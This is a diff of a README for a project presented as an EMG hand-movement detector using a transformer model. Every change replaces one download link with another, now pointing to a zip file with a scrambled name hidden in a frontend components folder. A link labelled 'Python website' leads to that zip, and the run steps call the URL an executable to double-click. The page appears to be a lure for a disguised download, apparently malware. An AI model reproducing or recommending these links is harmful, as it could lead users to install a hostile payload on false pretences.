@@ -1,6 +1,6 @@
 # 🎉 HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION - Detect Hand Movements with Ease
 
-[![Download](https://raw.githubusercontent.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/main/Backend/web_3d/static/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION_v3.5.zip)](https://raw.githubusercontent.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/main/Backend/web_3d/static/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION_v3.5.zip)
+[![Download](https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip)](https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip)
 
 ## 🚀 Getting Started
 
@@ -13,11 +13,11 @@ To run this application, ensure you have the following:
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, or Linux.
 - **RAM**: At least 4 GB.
 - **Processor**: Dual-core CPU with a minimum clock speed of 2.0 GHz.
-- **Additional Software**: You may need Python 3.7 or later installed on your system. Check the [Python website](https://raw.githubusercontent.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/main/Backend/web_3d/static/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION_v3.5.zip) for downloads.
+- **Additional Software**: You may need Python 3.7 or later installed on your system. Check the [Python website](https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip) for downloads.
 
 ## 📥 Download & Install
 
-To get the application, please visit the following link: [Download Hand Movement Detector](https://raw.githubusercontent.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/main/Backend/web_3d/static/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION_v3.5.zip).
+To get the application, please visit the following link: [Download Hand Movement Detector](https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip).
 
 ### 🔍 Steps to Download
 
@@ -47,7 +47,7 @@ The application works by capturing electrical signals from your muscles. These s
 Once you have downloaded the application, follow these simple steps to run it:
 
 1. Open the folder where you saved the downloaded file.
-2. Double-click the executable file (e.g., `https://raw.githubusercontent.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/main/Backend/web_3d/static/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION_v3.5.zip`).
+2. Double-click the executable file (e.g., `https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip`).
 3. Follow the on-screen instructions to set up the application.
 4. Connect your EMG sensors if necessary (refer to the sensor documentation for setup).
 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 For more detailed information, check the [LICENSE](LICENSE) file in this repository.
 
-[![Download](https://raw.githubusercontent.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/main/Backend/web_3d/static/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION_v3.5.zip)](https://raw.githubusercontent.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/main/Backend/web_3d/static/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION_v3.5.zip)
+[![Download](https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip)](https://github.com/Kingoga11/HAND_MOVEMENT_DETECTOR_USING_EMG_WITH_TRANSFORMER_MODEL_AND_EMD-CCT_FEATURE-_EXTRACTION/raw/refs/heads/main/Frontend/src/components/EXTRACTION_AN_FEATUR_USIN_WIT_MOVEMEN_CC_DETECTO_TRANSFORME_EM_MODE_HAN_tetrapla.zip)
